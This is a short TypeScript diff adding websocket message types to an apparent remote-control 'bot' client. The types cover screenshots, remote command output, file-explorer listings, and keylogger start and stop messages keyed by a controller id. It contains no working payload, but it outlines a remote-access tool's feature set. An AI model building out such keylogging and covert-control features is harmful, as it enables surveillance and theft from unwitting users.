@@ -1,3 +1,5 @@
+import { DirEntry } from "@/src/modules/ws-client/types/tasks.type";
+
 export interface WsBotSendMessage {
   title?: string;
   message: string;
@@ -19,8 +21,28 @@ export interface WsBotSendScreensEvent {
   }[];
 }
 
+export interface WsBotSendScreenshotEvent {
+  controllerid: string;
+  buffer: ArrayBuffer;
+}
+
 export interface WsBotSendCmdCommandEvent {
   controllerid: string;
   stdout: string;
   pwd: string;
+}
+
+export interface WsBotSendExplorerEvent {
+  controllerid: string;
+  files: DirEntry[];
+  folder: string;
+  relativepath: string;
+}
+
+export interface WsBotKeyLoggerStart {
+  controllerid: string;
+}
+
+export interface WsBotKeyLoggerStop {
+  controllerid: string;
 }
